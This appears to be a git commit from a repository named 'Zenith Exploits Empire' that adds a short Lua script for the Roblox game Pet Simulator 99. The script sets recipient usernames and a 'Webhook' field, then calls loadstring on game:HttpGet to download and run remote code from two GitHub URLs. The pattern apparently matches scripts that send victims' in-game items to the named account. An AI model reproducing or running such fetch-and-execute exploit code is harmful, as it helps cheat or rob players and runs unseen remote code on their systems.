84a87857f852d9650eb0327081911b77a6ebd213
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 22:33:36 +0200

    Added ps99 script: Bsbwhqh

---
+++ ps99/Bsbwhqh.lua
@@ -0,0 +1,5 @@
+Username = "GrowToPia_K1ng"
+Username2 = "GrowToPia_K1ng"
+Webhook = "loadstring(game:HttpGet('https://raw.githubusercontent.com/furqwk/BigGames/refs/heads/main/script.lua'))()"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
